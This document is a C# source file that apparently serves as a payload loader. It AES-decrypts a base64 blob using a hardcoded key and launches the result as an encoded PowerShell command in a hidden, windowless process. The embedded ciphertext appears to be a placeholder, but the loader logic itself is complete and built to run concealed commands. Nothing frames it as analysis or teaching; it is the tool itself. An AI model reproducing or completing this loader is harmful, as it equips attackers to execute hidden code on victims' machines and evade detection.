using System;
using System.IO;
using System.Security.Cryptography;
using System.Linq;
using System.Diagnostics;


namespace Default {
	public class Default {

		private static String key = "73c5c318c201b8561160db079a864d9d";
		private static String encryptedStringWithIV = "VGhpcyBpcyBhbiBJVjEyM6rf";

		public static void Main() {
			byte[] bytes = System.Convert.FromBase64String(encryptedStringWithIV);
			bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());
			Process process = new Process();
			process.StartInfo.UseShellExecute = false; 					
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments =  "-NoProfile -Enc " + System.Convert.ToBase64String(bytes);
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            process.WaitForExit();		
		}		

		private static byte[] decryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV) {
			if (cipherText == null || cipherText.Length <= 0)
				throw new ArgumentNullException("cipherText");
			if (Key == null || Key.Length <= 0)
				throw new ArgumentNullException("Key");
			if (IV == null || IV.Length <= 0)
				throw new ArgumentNullException("IV");
			byte[] plaintext = null;
			using (Aes aesAlg = Aes.Create()) {
				aesAlg.Key = Key;
				aesAlg.IV = IV;
				ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
				using (MemoryStream msDecrypt = new MemoryStream(cipherText)) {
					using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) {
						using (MemoryStream srDecrypt = new MemoryStream()) {
							csDecrypt.CopyTo(srDecrypt);
							plaintext = srDecrypt.ToArray();
						}
					}
				}
			}
			return plaintext;
		}    
	}
}

 
